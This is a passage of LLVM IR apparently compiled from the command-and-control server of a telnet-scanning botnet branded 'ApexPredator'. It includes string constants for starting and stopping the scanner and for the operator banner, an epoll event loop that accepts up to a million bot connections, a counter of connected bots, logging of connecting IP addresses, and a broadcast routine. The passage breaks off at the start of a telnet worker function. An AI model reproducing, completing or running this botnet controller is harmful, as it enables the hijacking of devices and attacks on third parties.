@.str.197 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.199 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.200 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.201 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.202 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.203 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.204 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.205 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.206 = private unnamed_addr constant [97 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] - Command:\1B[1;37m[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.207 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.208 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Screening Error\00", align 1
@.str.209 = private unnamed_addr constant [62 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From \00", align 1
@.str.210 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.211 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From [\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.212 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.213 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.214 = private unnamed_addr constant [87 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\0A\00", align 1
@.str.215 = private unnamed_addr constant [111 x i8] c"\1B[1;31m\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\0A\00", align 1
@.str.216 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.218 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.220 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.221 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.222 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@str = private unnamed_addr constant [110 x i8] c"\1B[1;31m\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\00"
@str.1 = private unnamed_addr constant [86 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\00"

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8* nocapture, i32, i32) local_unnamed_addr #0 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #10
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %14, %13
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.0.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.0.lcssa = phi i32 [ 1, %3 ], [ %.0.lcssa.ph, %.critedge.loopexit ]
  ret i32 %.0.lcssa
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #0 {
  %2 = tail call i64 @strlen(i8* %0) #9
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #9
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #9
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8* nocapture readonly, i32, i8* nocapture readnone) local_unnamed_addr #0 {
  %4 = alloca i64, align 8
  %5 = tail call i64 @strlen(i8* %0) #9
  %6 = add i64 %5, 10
  %7 = tail call noalias i8* @malloc(i64 %6) #10
  %8 = tail call i64 @strlen(i8* %0) #9
  %9 = add i64 %8, 10
  tail call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 %9, i32 1, i1 false)
  %10 = tail call i8* @strcpy(i8* %7, i8* %0) #10
  tail call void @trim(i8* %7)
  %11 = call i64 @time(i64* nonnull %4) #10
  %12 = call %struct.tm* @localtime(i64* nonnull %4) #10
  %13 = call i8* @asctime(%struct.tm* %12) #10
  call void @trim(i8* %13)
  call void @free(i8* %7) #10
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @epollEventLoop(i8* nocapture readnone) #5 {
  %2 = alloca %struct.epoll_event, align 4
  %3 = alloca %struct.sockaddr_in, align 2
  %tmpcast = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = tail call noalias i8* @calloc(i64 1000000, i64 12) #10
  %7 = bitcast i8* %6 to %struct.epoll_event*
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %10 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 1
  %11 = bitcast %union.epoll_data* %10 to i32*
  %12 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 0
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  br label %.loopexit.outer

.loopexit.outer.loopexit:                         ; preds = %91
  br label %.loopexit.outer

.loopexit.outer:                                  ; preds = %.loopexit.outer.loopexit, %1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.outer, %.loopexit
  %14 = load volatile i32, i32* @epollFD, align 4
  %15 = call i32 @epoll_wait(i32 %14, %struct.epoll_event* %7, i32 1000000, i32 -1) #10
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %.lr.ph62.preheader, label %.loopexit

.lr.ph62.preheader:                               ; preds = %.loopexit
  %17 = sext i32 %15 to i64
  br label %.lr.ph62

.lr.ph62:                                         ; preds = %.lr.ph62.preheader, %91
  %indvars.iv = phi i64 [ 0, %.lr.ph62.preheader ], [ %indvars.iv.next, %91 ]
  %18 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv, i32 0
  %19 = load i32, i32* %18, align 1
  %20 = and i32 %19, 25
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %29, label %22

; <label>:22:                                     ; preds = %.lr.ph62
  %23 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv, i32 1
  %24 = bitcast %union.epoll_data* %23 to i32*
  %25 = load i32, i32* %24, align 1
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %26, i32 2
  store i8 0, i8* %27, align 1
  %28 = call i32 @close(i32 %25) #10
  br label %91

; <label>:29:                                     ; preds = %.lr.ph62
  %30 = load volatile i32, i32* @listenFD, align 4
  %31 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv, i32 1
  %32 = bitcast %union.epoll_data* %31 to i32*
  %33 = load i32, i32* %32, align 1
  %34 = icmp eq i32 %30, %33
  br i1 %34, label %.preheader, label %62

.preheader:                                       ; preds = %29
  store i32 16, i32* %4, align 4
  %35 = load volatile i32, i32* @listenFD, align 4
  %36 = call i32 @accept(i32 %35, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %._crit_edge, label %.lr.ph57.preheader

.lr.ph57.preheader:                               ; preds = %.preheader
  br label %.lr.ph57

._crit_edge.loopexit:                             ; preds = %56
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %38 = tail call i32* @__errno_location() #11
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 11
  br i1 %40, label %91, label %41

; <label>:41:                                     ; preds = %._crit_edge
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0)) #12
  br label %91

.lr.ph57:                                         ; preds = %.lr.ph57.preheader, %56
  %42 = phi i32 [ %60, %56 ], [ %36, %.lr.ph57.preheader ]
  %43 = load i32, i32* %9, align 2
  %44 = sext i32 %42 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call fastcc i32 @make_socket_non_blocking(i32 %42)
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %50

; <label>:48:                                     ; preds = %.lr.ph57
  %49 = call i32 @close(i32 %42) #10
  br label %91

; <label>:50:                                     ; preds = %.lr.ph57
  store i32 %42, i32* %11, align 4
  store i32 -2147483647, i32* %12, align 4
  %51 = load volatile i32, i32* @epollFD, align 4
  %52 = call i32 @epoll_ctl(i32 %51, i32 1, i32 %42, %struct.epoll_event* nonnull %2) #10
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %56

; <label>:54:                                     ; preds = %50
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0)) #12
  %55 = call i32 @close(i32 %42) #10
  br label %91

; <label>:56:                                     ; preds = %50
  %57 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44, i32 2
  store i8 1, i8* %57, align 1
  %58 = call i64 @send(i32 %42, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i64 14, i32 16384) #10
  store i32 16, i32* %4, align 4
  %59 = load volatile i32, i32* @listenFD, align 4
  %60 = call i32 @accept(i32 %59, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %._crit_edge.loopexit, label %.lr.ph57

; <label>:62:                                     ; preds = %29
  %63 = sext i32 %33 to i64
  %64 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %63, i32 2
  store i8 1, i8* %64, align 1
  br label %65

; <label>:65:                                     ; preds = %.critedge, %62
  %.036 = phi i32 [ 0, %62 ], [ %.137, %.critedge ]
  call void @llvm.memset.p0i8.i64(i8* nonnull %13, i8 0, i64 2048, i32 16, i1 false)
  %66 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %33)
  %67 = sext i32 %66 to i64
  %68 = icmp sgt i32 %66, 0
  br i1 %68, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %65
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %69 = phi i64 [ %83, %.backedge ], [ %67, %.lr.ph.preheader ]
  %strchr = call i8* @strchr(i8* nonnull %8, i32 10)
  %70 = icmp eq i8* %strchr, null
  br i1 %70, label %.critedge.loopexit, label %71

; <label>:71:                                     ; preds = %.lr.ph
  call void @trim(i8* nonnull %8)
  %72 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  %75 = call i64 @send(i32 %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i64 5, i32 16384) #10
  %76 = icmp eq i64 %75, -1
  br i1 %76, label %.critedge.loopexit, label %.backedge

; <label>:77:                                     ; preds = %71
  %78 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0)) #9
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.backedge, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i8* nonnull %8)
  br label %.backedge

.backedge:                                        ; preds = %80, %74, %77
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 2048, i32 16, i1 false)
  %82 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %33)
  %83 = sext i32 %82 to i64
  %84 = icmp sgt i32 %82, 0
  br i1 %84, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %74, %.lr.ph, %.backedge
  %.lcssa.ph = phi i64 [ %69, %74 ], [ %69, %.lr.ph ], [ %83, %.backedge ]
  %.137.ph = phi i32 [ 1, %74 ], [ 1, %.lr.ph ], [ %.036, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %65
  %.lcssa = phi i64 [ %67, %65 ], [ %.lcssa.ph, %.critedge.loopexit ]
  %.137 = phi i32 [ %.036, %65 ], [ %.137.ph, %.critedge.loopexit ]
  switch i64 %.lcssa, label %65 [
    i64 -1, label %85
    i64 0, label %.thread.loopexit
  ]

; <label>:85:                                     ; preds = %.critedge
  %86 = tail call i32* @__errno_location() #11
  %87 = load i32, i32* %86, align 4
  %88 = icmp eq i32 %87, 11
  %89 = icmp eq i32 %.137, 0
  %or.cond43 = and i1 %89, %88
  br i1 %or.cond43, label %91, label %.thread

.thread.loopexit:                                 ; preds = %.critedge
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit, %85
  store i8 0, i8* %64, align 1
  %90 = call i32 @close(i32 %33) #10
  br label %91

; <label>:91:                                     ; preds = %85, %.thread, %41, %48, %54, %._crit_edge, %22
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %92 = icmp slt i64 %indvars.iv.next, %17
  br i1 %92, label %.lr.ph62, label %.loopexit.outer.loopexit
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #6

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @make_socket_non_blocking(i32) unnamed_addr #0 {
  %2 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i32 0) #10
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i64 0, i64 0)) #12
  br label %10

; <label>:5:                                      ; preds = %1
  %6 = or i32 %2, 2048
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i32 %6) #10
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %10

; <label>:9:                                      ; preds = %5
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i64 0, i64 0)) #12
  br label %10

; <label>:10:                                     ; preds = %5, %9, %4
  %.0 = phi i32 [ -1, %4 ], [ -1, %9 ], [ 0, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #3

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @clientsConnected() local_unnamed_addr #7 {
  br label %1

; <label>:1:                                      ; preds = %1, %0
  %indvars.iv = phi i64 [ 0, %0 ], [ %indvars.iv.next.4, %1 ]
  %.07 = phi i32 [ 0, %0 ], [ %.0..4, %1 ]
  %2 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 2
  %3 = load i8, i8* %2, align 1
  %not. = icmp ne i8 %3, 0
  %4 = zext i1 %not. to i32
  %.0. = add nsw i32 %4, %.07
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %5 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next, i32 2
  %6 = load i8, i8* %5, align 1
  %not..1 = icmp ne i8 %6, 0
  %7 = zext i1 %not..1 to i32
  %.0..1 = add nsw i32 %7, %.0.
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %8 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.1, i32 2
  %9 = load i8, i8* %8, align 1
  %not..2 = icmp ne i8 %9, 0
  %10 = zext i1 %not..2 to i32
  %.0..2 = add nsw i32 %10, %.0..1
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %11 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.2, i32 2
  %12 = load i8, i8* %11, align 1
  %not..3 = icmp ne i8 %12, 0
  %13 = zext i1 %not..3 to i32
  %.0..3 = add nsw i32 %13, %.0..2
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %14 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.3, i32 2
  %15 = load i8, i8* %14, align 1
  %not..4 = icmp ne i8 %15, 0
  %16 = zext i1 %not..4 to i32
  %.0..4 = add nsw i32 %16, %.0..3
  %indvars.iv.next.4 = add nsw i64 %indvars.iv, 5
  %exitcond.4 = icmp eq i64 %indvars.iv.next.4, 1000000
  br i1 %exitcond.4, label %17, label %1

; <label>:17:                                     ; preds = %1
  ret i32 %.0..4
}

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @titleWriter(i8*) #5 {
  %2 = alloca [2048 x i8], align 16
  %3 = ptrtoint i8* %0 to i64
  %4 = trunc i64 %3 to i32
  %5 = getelementptr inbounds [2048 x i8], [2048 x i8]* %2, i64 0, i64 0
  br label %6

; <label>:6:                                      ; preds = %6, %1
  call void @llvm.memset.p0i8.i64(i8* nonnull %5, i8 0, i64 2048, i32 16, i1 false)
  %7 = call i32 @clientsConnected()
  %8 = load volatile i32, i32* @managesConnected, align 4
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %5, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i64 0, i64 0), i32 27, i32 %7, i32 %8, i32 7) #10
  %10 = call i64 @strlen(i8* nonnull %5) #9
  %11 = call i64 @send(i32 %4, i8* nonnull %5, i64 %10, i32 16384) #10
  %12 = call i32 @sleep(i32 2) #10
  br label %6
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [512 x i8], align 16
  %3 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  %4 = icmp eq %struct._IO_FILE* %3, null
  br i1 %4, label %17, label %.preheader

.preheader:                                       ; preds = %1
  %5 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %6 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %7 = icmp eq i8* %6, null
  br i1 %7, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.015 = phi i32 [ %.0..011, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.0914 = phi i32 [ %.09., %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.01113 = phi i32 [ %11, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %8 = call i8* @strstr(i8* nonnull %5, i8* %0) #9
  %9 = icmp eq i8* %8, null
  %not. = xor i1 %9, true
  %10 = zext i1 %not. to i32
  %.09. = add nsw i32 %10, %.0914
  %.0..011 = select i1 %9, i32 %.015, i32 %.01113
  %11 = add nuw nsw i32 %.01113, 1
  %12 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %13 = icmp eq i8* %12, null
  br i1 %13, label %._crit_edge, label %.lr.ph

._crit_edge:                                      ; preds = %.lr.ph
  br i1 %4, label %15, label %._crit_edge.thread

._crit_edge.thread:                               ; preds = %.preheader, %._crit_edge
  %.0.lcssa19 = phi i32 [ %.0..011, %._crit_edge ], [ 0, %.preheader ]
  %.09.lcssa17 = phi i32 [ %.09., %._crit_edge ], [ 0, %.preheader ]
  %14 = call i32 @fclose(%struct._IO_FILE* nonnull %3)
  br label %15

; <label>:15:                                     ; preds = %._crit_edge, %._crit_edge.thread
  %.0.lcssa20 = phi i32 [ %.0..011, %._crit_edge ], [ %.0.lcssa19, %._crit_edge.thread ]
  %.09.lcssa18 = phi i32 [ %.09., %._crit_edge ], [ %.09.lcssa17, %._crit_edge.thread ]
  %16 = icmp eq i32 %.09.lcssa18, 0
  %..0 = select i1 %16, i32 0, i32 %.0.lcssa20
  br label %17

; <label>:17:                                     ; preds = %15, %1
  %.012 = phi i32 [ -1, %1 ], [ %..0, %15 ]
  ret i32 %.012
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) local_unnamed_addr #0 {
  %.sroa.0.4.extract.shift = lshr i64 %0, 32
  %.sroa.0.4.extract.trunc = trunc i64 %.sroa.0.4.extract.shift to i32
  %3 = and i32 %.sroa.0.4.extract.trunc, 255
  %4 = lshr i64 %0, 40
  %5 = trunc i64 %4 to i32
  %6 = and i32 %5, 255
  %7 = lshr i64 %0, 48
  %8 = trunc i64 %7 to i32
  %9 = and i32 %8, 255
  %10 = lshr i64 %0, 56
  %11 = trunc i64 %10 to i32
  %12 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0), i32 %3, i32 %6, i32 %9, i32 %11)
  %13 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %14 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %13, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.14, i64 0, i64 0), i32 %3, i32 %6, i32 %9, i32 %11)
  %15 = tail call i32 @fclose(%struct._IO_FILE* %13)
  ret void
}

; Function Attrs: nounwind
declare i32 @fprintf(%struct._IO_FILE* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define noalias i8* @telnetWorker(i8*) #0 {
  %2 = alloca i64, align 8
  %3 = alloca [2048 x i8], align 16
  %4 = alloca [80 x i8], align 16
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [5000 x i8], align 16
  %7 = alloca [5000 x i8], align 16
  %8 = alloca [5000 x i8], align 16
  %9 = alloca [90000 x i8], align 16
